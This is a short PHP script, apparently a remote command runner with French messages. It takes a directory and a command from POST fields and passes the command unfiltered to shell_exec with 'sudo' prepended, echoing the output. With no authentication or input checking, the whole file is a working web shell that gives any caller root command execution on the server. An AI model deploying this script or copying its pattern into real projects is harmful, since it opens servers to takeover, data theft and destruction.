<?php

	if(isset($_POST['repertoire']) && isset($_POST['commande'])) {
	
	   if($_POST['repertoire'] != "") {
	      $rep = chdir($_POST['repertoire']);
	      if($rep == 1) {
	         $rep = $_POST['repertoire'];
	      } else {
	         $rep = "(" .$_POST['repertoire']. " : Impossible d'ouvrir ce dossier !!), commande exécuté ici : " .getcwd();
	      }
	   } else {
	      $rep = getcwd();
	   }

	   $cmd = shell_exec('sudo ' .$_POST['commande']. ' &');
	   echo "repertoire: " .$rep. "\ncommande " .$_POST['commande']. ": " .$cmd;
	}

?>